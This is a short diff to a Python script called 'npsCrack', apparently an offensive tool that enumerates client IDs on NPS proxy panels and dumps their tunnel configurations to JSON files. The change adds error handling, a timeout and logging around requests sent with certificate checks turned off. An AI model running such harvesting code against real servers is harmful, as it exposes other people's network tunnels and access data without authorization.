@@ -2,7 +2,7 @@
 Author         : Sp4ce
 Date           : 2020-11-23 11:31:02
 LastEditors    : Sp4ce
-LastEditTime   : 2020-11-24 15:17:02
+LastEditTime   : 2020-11-24 19:45:25
 Description    : Challenge Everything.
 '''
 import argparse
@@ -265,17 +265,23 @@ class npsCrack:
         data['search'] = ''
         for i in self.clientsId:
             data['client_id'] = i
-            res = requests.post(url=self.tunnelUrl.format(URL=url),
+            try:
+                res = requests.post(url=self.tunnelUrl.format(URL=url),
                                 data=data,
                                 headers=self.headers,
+                                timeout=self.timeout,
                                 verify=False)
-            saveFilename = self.savePath + '/tunnels/Client-[' + str(
-                i) + ']-Tunnels-Info.json'
-            resJson = json.loads(res.text)
-            allRows = resJson['rows']
-            if len(allRows) > 0:
-                with open(saveFilename, 'a+') as f:
-                    f.write(json.dumps(allRows, indent=2))
+                logger.info('Get client {CLIENTID} tunnels success.'.format(CLIENTID=i))
+                saveFilename = self.savePath + '/tunnels/Client-[' + str(
+                    i) + ']-Tunnels-Info.json'
+                resJson = json.loads(res.text)
+                allRows = resJson['rows']
+                if len(allRows) > 0:
+                    with open(saveFilename, 'a+') as f:
+                        f.write(json.dumps(allRows, indent=2))
+            except:
+                logger.error('Tunnels connect failed.')
+
 
     def run(self):
         if os.path.isfile(self.targetFile):
